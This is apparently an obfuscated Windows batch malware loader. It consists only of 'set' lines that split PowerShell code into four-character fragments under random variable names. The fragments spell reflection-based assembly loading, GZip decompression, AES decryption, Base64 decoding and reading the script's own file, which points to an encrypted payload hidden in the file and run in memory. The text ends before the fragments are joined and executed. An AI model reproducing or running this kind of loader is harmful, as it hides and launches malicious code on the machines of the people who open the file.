@echo off
set "KymWyNffro=[Sys"
set "NEbhHKrSMz=$GDQ"
set "GyqkrytKyd=TllA"
set "rtdyAyIuZw=em.I"
set "aeawqcksUf=aLOm"
set "WuObVhEise=d;$e"
set "tlWsTUOqHt=1..-"
set "UqKSCJplwB=n ''"
set "KYdSxDyBcy=yXyt"
set "pjoeMjJNsS=;$WM"
set "gBWXwUGXVf=n ''"
set "KCbGMaBKRq=.Cop"
set "wOaBYSclOQ=m.IO"
set "zvBSFOHAay=DMn."
set "sboGjIZNTI=fore"
set "ODdbleWuzb=RmAx"
set "GjmDDOVVhn=]::C"
set "veyPUHOZeF=Disp"
set "WvucEBdxIk=evFe"
set "aYKQTGbWBm=-4] "
set "HNxoFIOCdj=It ="
set "BqaddllZWs=F'[-"
set "njHDpUIXEC=rtS4"
set "tpePmtsFfm=.GZi"
set "TAkYSXpjgr=vert"
set "QfrAMQenPv=::('"
set "cPopRokZbi=$evF"
set "surcYTuVVz=t Sy"
set "KUqMLKotTq=Syst"
set "zoflPCetHk=.Cry"
set "JGrTIbECcD=tem."
set "fiiZnIZaRP=CFxo"
set "ywldZeZNCs= '')"
set "PkBCbogbqy=trea"
set "GoeCzwjnOb=rt]:"
set "IMtnOolUHs=Obje"
set "qxcysGYpIF=;$yX"
set "Wfxpqxsola=] -j"
set "vezUovyjvc=ress"
set "XRvWSLUDPR=T = "
set "sDHgJqGiVa=PxEW"
set "xCkgzDXwVz=-nop"
set "AshwybfjgY=null"
set "GupaVeBegI=ptog"
set "etMbzKcecE=Comp"
set "WFwGyiBWWW=)($C"
set "AmBkafALoF= [st"
set "HHbzonZlgv=bjec"
set "ZbXHRwmrVX=daeR"
set "urrnrIhViR=ecry"
set "sXFGoYDNTD=pres"
set "GALwsGIPSt=Conv"
set "UmTDIQsdSI=ne);"
set "psagHMIwdB=gth)"
set "mLpnsekSuH=$CKs"
set "nHzgzKRrLX=grap"
set "aCwvrcocEF=zuZI"
set "BuZwABRcdF=morF"
set "RbiQZybNuY=);$r"
set "CSUBCFcfDX=$VXj"
set "gWYqUwASGa=ct S"
set "zLOzDbsDFs=flec"
set "PBYxhNawXi=i.Pa"
set "fEABraGgwt=oin "
set "mRwxdbVRuj=, $C"
set "ohRPByMGUl=zHhH"
set "pBqbEOooEd=bstr"
set "jLvGsRFHLb=ring"
set "LPgtfWTDql=X = "
set "peCzbKoTIe=BC;$"
set "XSFUgEbKiv=oint"
set "piceIIAcbG=orF'"
set "UyfivQQoXX=[-1."
set "XmaAWUvXow=pher"
set "oNKKqXaRSc=Vb.T"
set "glMPDnzCZx=oL'["
set "BsQmUMpzzO=('%~f0'"
set "wIGTxGwEBh=ode]"
set "WiUObxycFD=ew-O"
set "VATMjMLUTs=);$e"
set "PvLkOrPOtP=stem"
set "mrbsKKbWOz=.Dis"
set "qgNLahHSfv=esMa"
set "wKJgwhNMGy=ct S"
set "HwDgZoQXvs=('%*'"
set "OaNnFMCCYq=3); "
set "jtCkazxtWA=NT);"
set "fTwbghYvRz=ke($"
set "tdwMuQWpEQ=$zDT"
set "UXhmZKomSv=ach "
set "jCkrNdWTSY=[IO."
set "LcKNbElDyy=lBlo"
set "EqybAsmpYt=New-"
set "ZiedojfoqP=-Obj"
set "WjFWOQYSCJ=Secu"
set "NPNnhcErhw=16] "
set "wPoQGKctgk=Obje"
set "ppCcMeVgQP=.Ass"
set "cfpQakqrng=[Sys"
set "TWgZrQVttS=$EeU"
set "TFmCiNCCTJ=ytX."
set "zMoRjsVwnS=saBm"
set "ZowggaJspi= [Sy"
set "FZCAFgUNfs=vFei"
set "OhvYzRzdLH=$CKs"
set "TfHjIBuSxu=gnir"
set "WDSBdzYEpU=Disp"
set "EgwBFgxFGv=ei.I"
set "YUVCAEzfFV=stem"
set "jKWXFoNdvS=; };"
set "SCAAFpGixK=eMVs"
set "EsIiIRaFzW=vFei"
set "UDVOmMYryA=DS.D"
set "lYOcASBLiG=nirt"
set "fToupUtbcE=raph"
set "XyDrNlINNv= if "
set "zeQurARJqR=)) {"
set "NHpLCfNEOH=.Cre"
set "iftDgHUsBR=ispo"
set "YPxUxAnTCt=rity"
set "SvcpnUwGGZ=WMlx"
set "FTthdTQlGt=New-"
